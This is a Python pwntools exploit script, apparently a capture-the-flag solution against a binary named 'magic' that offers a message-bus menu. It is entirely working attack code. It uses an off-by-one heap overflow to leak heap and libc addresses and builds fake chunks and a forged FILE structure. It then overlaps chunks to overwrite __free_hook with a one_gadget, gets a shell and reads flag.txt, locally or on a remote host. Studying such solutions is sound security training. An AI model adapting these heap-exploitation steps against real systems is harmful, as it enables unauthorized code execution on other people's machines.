#!/usr/bin/env python3

from binascii import hexlify, unhexlify
from pwn import *
import json
import typing
import argparse as ap

# Local Imports
import file_io

BINARY_PATH="../static/build"
BINARY_NAME="magic"

# context.log_level = "debug"

class Interface():
    MSG_FORMAT = {
        "payload": {
            "msg": "",
            "hex": True,
            "pipe_id": 0,
            "msg_id": 0
        }}

    def __init__(self, io):
        io.recvuntil(b"> ")
        io.timeout = 1
        self.io = io

    def post_msg(self, msg_id: int,
                       pipe_id: int,
                       ishex: bool,
                       msg: bytes) -> bytes:
        
        self.io.sendline(b"1")
        self.io.sendlineafter(b"msg_id: ", str(msg_id).encode())
        self.io.sendlineafter(b"pipe_id: ", str(pipe_id).encode())
        self.io.sendlineafter(b"hex: ", b'1' if ishex else b'0')
        self.io.sendlineafter(b"bus: ", msg)

        output = self.io.recvuntil(b"1: ", drop=True)
        
        self.io.recvuntil(b"> ")
        
        return output

    def handle_st_msg(self, st_num, num_to_handle=1) -> None:
        resp = ""
        for _ in range(num_to_handle):
            self.io.sendline(str(st_num + 2).encode())
            resp = self.io.recvuntil(b"> ")
            
        return resp

    def exit_prog(self) -> None:
        self.io.sendline(b"4")
        
        # time.sleep(5)
        output = self.io.recvuntil(b"Bye")
        
        return output

    def interactive(self):
        self.io.interactive()

def overflow(io : Interface, 
             fill : bytes, 
             chunk_size : int, 
             extra_byte : bytes, 
             msg_id : int=100, 
             pipe_id : int=0, 
             p : bool=True):

    # Chunk sizes must be divisible by 8
    # and must end in an 8
    if chunk_size % 8 != 0:
        chunk_size += 8 + (chunk_size % 8)
    if (chunk_size // 8 % 2) == 0:
        chunk_size -= 8

    msg = fill * (chunk_size // len(fill))
    msg = hexlify(msg) + extra_byte[0:1]
    # msg = hexlify(msg) + int.to_bytes(extra_byte, 1, "little")
    print(f"msg: {hex(len(msg))} : {msg}")

    response = io.post_msg(
        msg_id=msg_id,
        pipe_id=pipe_id,
        ishex=True,
        msg=msg
    )

    if p: print(response)

def make_chunk(io : Interface,
               chunk_size: int,
               msg_id : int=100,
               pipe_id : int=0,
               fill: bytes=None,
               ishex : bool=False,
               p : bool=True):

    if fill is None:
        fill = cyclic(8)
    
    # Chunk sizes must be divisible by 8
    # and must end in an 8
    if chunk_size % 8 != 0:
        chunk_size -= 8 + (chunk_size % 8)
    if (chunk_size // 8 % 2) == 0:
        chunk_size -= 8

    if ishex: 
        msg = hexlify(fill) * (chunk_size // len(fill))
    else:
        msg = fill * (chunk_size // len(fill))

    print(f"Making message with size: {hex(len(msg))}")
    response = io.post_msg(
        msg_id=msg_id,
        pipe_id=pipe_id,
        ishex=ishex,
        msg=msg
    )

    if p: print(response)

def make_chunk_exact(io : Interface,
                     chunk: bytes,
                     msg_id : int=100,
                     pipe_id : int=0,
                     ishex : bool=False,
                     p : bool=True):
    print(f"Making exact chunk with len: {hex(len(chunk))}")

    if ishex: 
        msg = hexlify(chunk)
    else:
        msg = chunk

    response = io.post_msg(
        msg_id=msg_id,
        pipe_id=pipe_id,
        ishex=ishex,
        msg=msg
    )

    if p: print(response)

def leak(io, heap_offset=0x10, libc_offset=0x1ed0b0):

    make_chunk(io, 0x400, pipe_id=1, fill=p64(0x0))
    
    io.handle_st_msg(1)
    overflow(io, fill=p64(0), pipe_id=1, chunk_size=0x190, extra_byte=b'1')
    io.handle_st_msg(1)

    overflow(io, fill=p64(0), pipe_id=1, chunk_size=0x600, extra_byte=b'1')
    resp = io.handle_st_msg(1)

    m_0 = b"Message\n"
    m_1 = b" \nClearing msg"
    resp = resp[resp.index(m_0)+len(m_0):resp.index(m_1)]
    values = resp.split(b" ")

    ascii_to_addr = lambda l: u64(bytes([int(i, 16) for i in l]))
    
    heap_leak = ascii_to_addr(values[0x608:0x608+8])
    libc_leak = ascii_to_addr(values[0xa20:0xa20+8])

    print(f"heap_leak: {hex(heap_leak)}\n", heap_leak)
    print(f"libc_leak: {hex(libc_leak)}\n", libc_leak)

    return heap_leak-heap_offset, libc_leak-libc_offset

def main(proc_io, local=False):
    io = Interface(proc_io)

    # context.log_level = "debug"
    # time.sleep(50)

    # io.interactive()

    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    # libc = ELF("../libc-2.31.so")
    heap_base, libc.address = 0x55555555c000, 0x7ffff7bc7000
    heap_base, libc.address = leak(io)

    print(f"heap_base: {hex(heap_base)} | libc.address: {hex(libc.address)}")

    one_gadget = libc.symbols['execvpe'] + 0x281
    io_list_all_addr = libc.symbols['_IO_list_all']
    free_hook = libc.symbols['__free_hook']

    make_chunk(io, 0x400, pipe_id=1, fill=p64(0x0))
    for _ in range(7):
        make_chunk(io, 0x110, pipe_id=1, fill=p64(0x0))
    
    io.handle_st_msg(1, 8)

    make_chunk(io, 0x150, pipe_id=1)

    if local:
        chunk_addr = heap_base + 0x174d0
    else:
        chunk_addr = heap_base + 0x180d0
    
    # Make a fake chunk with the fwd and bkwd pointers being the addr of current chunk
    chunk = p64(0) + p64(0x90) + \
            p64(chunk_addr) + p64(chunk_addr) + \
            cyclic(0x38)

    print("Making Fake chunk")

    make_chunk_exact(io, chunk, pipe_id=0)
    make_chunk_exact(io, chunk, pipe_id=0)
    print("Made Fake chunks")

    # io.interactive()

    make_chunk(io, 0x40)

    file_struct = file_io.make_bad_fio(libc)

    make_chunk_exact(io, p64(0) * 2 + file_struct, pipe_id=1)
    make_chunk(io, 0x100, pipe_id=0)

    print("Made bad fileio chunk", flush=True)

    # io.interactive()

    io.handle_st_msg(0,3)

    overflow(io, fill=p64(0x90), chunk_size=0x40, extra_byte=b'0')
    make_chunk_exact(io, chunk, pipe_id=0)

    # io.interactive()

    # fill tcache
    for _ in range(6):
        make_chunk(io, 0x100, pipe_id=1)
    io.handle_st_msg(1, 8)

    # io.interactive()

    make_chunk(io, 0x40, pipe_id=1)
    io.handle_st_msg(1)

    io.handle_st_msg(0, 2)

    chunk_overlap = cyclic(9 * 8) + p64(0x41) + \
                    p64(free_hook) + p64(0) + \
                    cyclic(5 * 8) + p64(0x100) + \
                    cyclic(31*8)


    make_chunk_exact(io, chunk_overlap)
    make_chunk_exact(io, chunk_overlap)

    print("Made overlapping chunk")

    make_chunk(io, 0x40)

    og_chunk = p64(one_gadget) + p64(0) * (0x30//8)

    make_chunk_exact(io, og_chunk)

    io.io.sendline(b"cat flag.txt")
    flag = io.io.recvline()

    print(f"Got flag!: {flag}", flush=True)
    # io.interactive()

if __name__ == "__main__":
    parser = ap.ArgumentParser()
    parser.add_argument('--hostname')
    parser.add_argument('--port')
    parser.add_argument('--debug', '-d', action='store_true')

    run_type = parser.add_mutually_exclusive_group()

    run_type.add_argument('--GDB', action='store_true')
    run_type.add_argument('--LOCAL', action='store_true')
    args = parser.parse_args()

    if args.debug:
        context.log_level = 'debug'

    proc_io = None

    gs = """
    set max-visualize-chunk-size 0x500
    #break free
    continue
    """

    local = True
    if args.GDB:
        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        proc_io = gdb.debug(elf.path, gdbscript=gs)
    elif args.LOCAL:
        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        proc_io = process(elf.path)
    else:
        if not (args.hostname or args.port):
            parser.print_usage()
            print("error: the following arguments are required: --hostname, --port")
            exit(-1)
        proc_io = remote(args.hostname, args.port )
        local=False
    
    # get ticket from environment
    ticket = os.getenv("TICKET")
    
    if ticket is not None:
        # Do a ticket submission
        proc_io.recvuntil(b"Ticket please:")
        proc_io.sendline(bytes(ticket, 'utf-8'))


    main(proc_io, local)
